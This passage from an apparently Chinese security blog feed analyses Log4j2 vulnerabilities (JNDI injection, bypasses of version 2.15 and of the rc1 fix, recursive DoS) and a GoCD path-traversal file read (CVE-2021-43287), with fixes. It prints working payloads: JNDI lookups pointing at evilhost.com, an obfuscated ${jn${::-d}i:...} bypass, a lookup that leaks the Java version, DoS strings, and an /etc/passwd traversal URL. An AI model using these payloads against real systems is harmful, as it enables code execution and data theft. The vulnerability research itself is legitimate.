6ecb56</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码的哦！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF Misc" scheme="http://example.com/tags/CTF-Misc/"/>
    
  </entry>
  
  <entry>
    <title>闲聊log4j2</title>
    <link href="http://example.com/2022/01/19/%E9%97%B2%E8%B0%88log4j2/"/>
    <id>http://example.com/2022/01/19/%E9%97%B2%E8%B0%88log4j2/</id>
    <published>2022-01-19T13:16:05.000Z</published>
    <updated>2022-01-20T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="闲谈log4j2"><a href="#闲谈log4j2" class="headerlink" title="闲谈log4j2"></a>闲谈log4j2</h1><h2 id="log4j2爆炸漏洞"><a href="#log4j2爆炸漏洞" class="headerlink" title="log4j2爆炸漏洞"></a>log4j2爆炸漏洞</h2><p>简单的说一下最近这个log4j2漏洞吧，这个漏洞自己也跟了有一段时间了。第一次在学长那听到了这个漏洞，当时只是跟但了jndi注入点并没有发现漏洞的入口，也就是${jndi:ldap://127.0.0.1/exp}.一方面是没有想到这个功能，但是之后感觉官方文档里面说了<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">文档</a>，可能是自己语文水平不太好。(有点吃亏。。。</p><h2 id="挖掘新问题"><a href="#挖掘新问题" class="headerlink" title="挖掘新问题"></a>挖掘新问题</h2><p>然后就是复现漏洞。挖新的问题。当时第一时间感觉这个东西肯定有问题，第一时间就想到了dos。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644571-d87566e9-ac55-44f7-aaf3-0a64beb97b01.png" alt="image-20211218215051277"></p><p>当时因为环境没有配置起就去睡觉了，当时已经是晚上的3点了。</p><p>说一下我当时发现的dos问题大致是因为数组长度我们可以控制造成溢出。第二天中午我大哥就提交了dos漏洞。之后就没有管了。</p><h2 id="绕过rc1"><a href="#绕过rc1" class="headerlink" title="绕过rc1"></a>绕过rc1</h2><p>在然后说一下绕过rc1吧这个东西虽然简单但是我调试了一下午，大概是因为对异常没有处理，也就是在catch中没有return，导致程序会继续执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644576-d80164ab-1879-4e01-a50e-626f1c99bf5e.png" alt="Q`X GHE7UL3 IBYUAB0EFW"></p><p>所以绕过思路就直接让new url(name) 抛出异常就欧克。</p><p>tips:和bypass7u21差不多。。。</p><h2 id="修复问题"><a href="#修复问题" class="headerlink" title="修复问题"></a>修复问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">今天看陈师傅写的文章，也就是修复log4j的坑。</span><br><span class="line">在漏洞报出来的时候修复的方法是：</span><br><span class="line"></span><br><span class="line">1.设置配置文件参数 log4j2.formatMsgNoLookups=true,</span><br><span class="line">2.vm启动环境参数 -Dlog4j2.formatMsgNolookups=true,</span><br><span class="line">3,设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true</span><br><span class="line">而这样的修复是打破这个判断</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146644579-6ed47eaf-8666-42ed-be31-7a01d83d860c.png" alt="image-20211215142114290"></p><p>认真看该代码其实在下面还有一个入口。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644583-ac2f76eb-028d-4afb-8f72-e5848746b49c.png" alt="image-20211215142251448"></p><p>可以看到判断条件是 <strong>msg instanceof StringBuilderFormattable</strong></p><p>所以可以走第二个入口就绕过了log4j2.formatMsgNoLookups=true的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.printf(Level.ERROR,<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:2333&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd">https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd</a></p><p><a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p></blockquote><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>信息泄露这个问题我在漏洞刚刚出来的那天晚上就想到了，只是对比rce，信息泄露就微不足道。因为log4j2支持很多协议 sys等等可以看到env等等这些的信息，然后通过dns带出来。</p><p>不过值得说一下其中有一个思路通过ResourceBundleLookup类去获得读取项目中后缀为properties的配置文件，其中就可能有username/password。当时我是看到了只是不知道这个方法是干啥子的也没有去百度。。。哭死了。</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><p><a href="https://www.cnblogs.com/jona-test/p/11399218.html">https://www.cnblogs.com/jona-test/p/11399218.html</a></p><p>更新 2021/12/24</p><p>看了大哥4ra1n的文章 <a href="https://xz.aliyun.com/t/10659">https://xz.aliyun.com/t/10659</a></p><p>其中学习了dns（DNS协议是属于JNDI协议的） 可以带出数据 nc -lvup 通过udp接</p><p><img src="https://user-images.githubusercontent.com/63966847/147314294-222e4af5-98b3-4eac-863a-64316c775f91.png" alt="image"></p><p>然后就是回显的问题，通过报错来回显，其中port本该是int如果给它无法转int的字符串就会抛出这里的信息(触发RuntimeException)，并且ignoreExceptions配置为false。触发RuntimeException()</p><p>而NumberFormatException就是触发RuntimeException的子类。</p><p>${jndi:ldap://x.x.x.x:${java:version}/xxx}</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>这个东西太多了，在tw一看就很多很多。一方面是因为一些协议可以返回输入的值比如：lower data</p><p>还有一个bypass思路是因为执行解析log4j2中的${}问题。简单的说也是将${::-x}解析成x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jn$&#123;::-d&#125;i:ldap://127.0.0.1:8880/&#125;</span><br></pre></td></tr></table></figure><h2 id="cve-dos"><a href="#cve-dos" class="headerlink" title="cve-dos"></a>cve-dos</h2><p>大哥成功获得apache的cve。<a href="https://xz.aliyun.com/t/10670">https://xz.aliyun.com/t/10670</a></p><p>简单的看了一下发现里面的思路和我不一样，大哥是想到了网络连接，也就可以存在一个网络超时的问题，而且log4j2支持递归解析。。所以就让他一直解析网络超时的ip…造成dos.</p><p>在这个cve通报中发现存在rce?简单的看了一下，我的理解是因为配置文件配置的这一次解析问题,如下配置中就有$${}这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Appenders&gt;</span><br><span class="line">    &lt;Console name=&quot;STDOUT&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">        &lt;PatternLayout&gt;</span><br><span class="line">            &lt;pattern&gt;%d %p %c&#123;1.&#125; [%t] $$&#123;ctx:loginId&#125; %m%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/PatternLayout&gt;</span><br><span class="line">    &lt;/Console&gt;</span><br><span class="line">&lt;/Appenders&gt;</span><br></pre></td></tr></table></figure><p>而其中里面了ctx协议ContextMapLookup类，简单的说大概就是将我们解析的东西放到map里面然后在取出来。取出来之后在解析${xxxx}就造成了rce问题/dos问题。</p><h2 id="bypass-2-15"><a href="#bypass-2-15" class="headerlink" title="bypass 2.15"></a>bypass 2.15</h2><p>昨天在tw上看到了bypass 2.15版本,这个东西还没有具体去复现。不过看了一下exp大致懂了。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>不过环境要求比较严格而且真实环境的rce可能比较可能。。。</p><p>2021/12/20更新</p><p>今天看到了大哥写的bypass 2.15 rce分析简单的记录一下 <a href="https://xz.aliyun.com/t/10689">https://xz.aliyun.com/t/10689</a></p><p>利用条件</p><p>1.开启lookup功能</p><p>2.macos系统</p><p>3.泛域名解析</p><p>4.本地存在gadget</p><p>该exp通过去绕过了ip限制并且可以解析远程恶意ip(macos系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>然后去绕过ldap服务的限制。</p><p><img src="https://user-images.githubusercontent.com/63966847/146754506-bccfb16a-57e0-40d6-be17-36cbe67705a7.png" alt="image-20211220183446609"></p><p>正常情况是直接通过Reference去利用，不过这里不能使用Reference，所以就利用deserializeObject，其实就是bypass jdk8u191。满足本地存在gadget。只是需要把classname换成基本数据类型。去绕过<strong>if (!allowedClasses.contains(className))</strong></p><p>也其实就是我们在了ldap的时候的思路 <strong>LDAP服务攻击一般是先测Reference再测deserializeObject</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/146754481-8d5aff45-fa12-4593-9165-ace4aa0257bd.png" alt="image-20211220183705875"></p><h2 id="CVE-2021-45105"><a href="#CVE-2021-45105" class="headerlink" title="CVE-2021-45105"></a>CVE-2021-45105</h2><p>这个漏洞我看了下没有看太懂，也就不这么介绍了反正大概介绍递归解析的问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-::-$$&#123;::-$&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$ 会进入一个异常</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146945232-9157632d-2463-4d2c-976d-544e49ff249c.png" alt="image"></p><p><del>说不定其他解析表达式也存在。。。。</del></p><p><a href="https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor">https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor</a></p><p><a href="https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc">https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc</a></p><p>更新 2021/12/22</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在配置文件中配置：$$&#123;ctx:apiVersion&#125;   则输入 $&#123;$&#123;ctx:apiVersion&#125;&#125;或$&#123;$&#123;::-$&#123;::-$$&#123;::-aaa&#125;&#125;&#125;&#125;则可以造成递归dos</span><br><span class="line">在配置文件中配置：$&#123;ctx:apiVersion&#125;   则输入$&#123;$&#123;::-$&#123;::-$$&#123;::-dos&#125;&#125;&#125;&#125;则可以造成递归dos</span><br></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>cve:<a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODA4Mw==&amp;mid=2247484028&amp;idx=1&amp;sn=5748c6b75530a786f1bf0622616413c6&amp;chksm=cf45fa30f83273269da4884f82c5d4ce43089d6ba8a7b6470e35f963d690ec781faa85ab48e1&amp;mpshare=1&amp;scene=23&amp;srcid=12298p7j6KLY39FVuwNzmFRD&amp;sharer_sharetime=1640749370687&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">聊聊配置文件 RCE 这件事</a></p><p>不愧是师傅总结的不错，简单的说就是通过配置文件去rce.<br>突然又想到了一个：web.xml里面添加servlet去实现解析一句话。<br>访问/exp路由就会解析</p><p><img src="https://user-images.githubusercontent.com/63966847/147626724-576ba23e-7fdf-4b73-b591-095af4578f8a.png" alt="image"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/WEB-INF/1.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/exp<span class="tag">&lt;/<span class="name">url-patten</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>主要是自己的问题，</p><p>第一点是读文档的习惯少导致不理解其中的意思失去第一时间拥有exp</p><p>第二点是自己没有考虑到dos中的网络连接超时问题。</p><p>第三点是自己发现了ResourceBundleLookup类却不知道其意思导致失去新思路的发现。</p><p>（如果官方在删除lookup功能我相信还会有更多的漏洞。。。。。。。。</p>]]></content>
    
    
    <summary type="html">log4j2漏洞</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE 2021 43287</title>
    <link href="http://example.com/2022/01/10/CVE-2021-43287/"/>
    <id>http://example.com/2022/01/10/CVE-2021-43287/</id>
    <published>2022-01-09T16:18:15.000Z</published>
    <updated>2022-11-25T12:54:47.086Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CVE-2021-43287"><a href="#CVE-2021-43287" class="headerlink" title="CVE 2021 43287"></a>CVE 2021 43287</h1><blockquote><p>GoCD 一款先进的持续集成和发布管理系统,由ThoughtWorks开发。（不要和Google的编程语言Go混淆了！）其前身为CruiseControl,是ThoughtWorks在做咨询和交付交付项目时自己开发的一款开源的持续集成工具。后来随着持续集成及持续部署的火热，ThoughtWorks专门成立了一个项目组，基于Cruise开发除了Go这款工具。ThoughtWorks开源持续交付工具Go。使用Go来建立起一个项目的持续部署pipeline是非常快的，非常方便。 GoCD的v20.6.0 - v21.2.0版本存在任意文件读取漏洞，可以通过/go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../etc/passwd 对文件进行读取。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20.6.0 - v21.2.0</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621578-1249eeb8-f454-48ac-8edc-c5385a69661d.png" alt="image-20220115201323862"></p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621580-174d710e-5900-4860-b877-6a67f115c13c.png" alt="image-20220115201231569"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488">https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488</a></p><p><img src="https://user-images.githubusercontent.com/63966847/149621583-5334295f-a207-4da9-b5ad-1182bacf76d2.png" alt="image-20220115201143857"></p><p>删除了路由。</p>]]></content>
    
    
    <summary type="html">CVE 2021 43287</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
